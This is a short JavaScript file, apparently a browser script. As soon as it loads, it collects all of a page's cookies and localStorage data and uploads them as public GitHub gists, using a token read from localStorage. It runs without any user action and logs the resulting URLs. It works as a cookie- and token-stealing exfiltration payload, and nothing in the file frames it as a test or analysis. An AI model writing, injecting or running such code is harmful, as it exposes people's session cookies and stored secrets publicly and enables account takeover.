async function createGist(filename, content, token) {
    const response = await fetch('https://api.github.com/gists', {
      method: 'POST',
      headers: {
        'Authorization': `token ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        description: 'Cookies and Local Storage Data',
        public: true,
        files: {
          [filename]: {
            content: content
          }
        }
      })
    });
    const data = await response.json();
    return data.html_url;
  }
  
  function getCookies() {
    return document.cookie.split(';').reduce((cookies, cookie) => {
      const [name, value] = cookie.split('=').map(c => c.trim());
      cookies[name] = value;
      return cookies;
    }, {});
  }
  
  function getLocalStorage() {
    return Object.keys(localStorage).reduce((data, key) => {
      data[key] = localStorage.getItem(key);
      return data;
    }, {});
  }
  
  async function saveDataOnline() {
    const cookies = getCookies();
    const localStorageData = getLocalStorage();
  
    const token = localStorage.getItem('gst_tkn');
  
    const cookiesUrl = await createGist('cookies.json', JSON.stringify(cookies, null, 2), token);
    const localStorageUrl = await createGist('localStorage.json', JSON.stringify(localStorageData, null, 2), token);
  
    console.log('Cookies Gist URL:', cookiesUrl);
    console.log('Local Storage Gist URL:', localStorageUrl);
  }
  
  saveDataOnline();
